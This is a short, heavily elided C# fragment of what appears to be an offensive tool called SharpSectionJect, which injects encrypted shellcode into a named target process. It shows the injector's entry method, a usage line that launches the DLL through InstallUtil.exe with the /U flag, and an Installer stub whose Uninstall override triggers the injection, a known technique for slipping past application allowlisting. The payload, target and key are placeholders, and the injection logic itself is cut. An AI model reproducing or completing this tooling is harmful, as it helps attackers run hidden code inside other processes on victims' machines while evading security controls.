...
public class SharpSectionJect
{
    ...
    public static void Inj(string arg1, string arg2, string arg3)
    {
        ...
        if (args.Length == 3)
        {
            ...
            Console.WriteLine(@"Usage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U /logfile= /logtoconsole=false SharpSectionJect.dll");
...
public class Stub : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        SharpSectionJect.Inj("<target_procname>", "<b64_encrypted_shellcode>", "<shellcode_encryption_key>");
    }
}
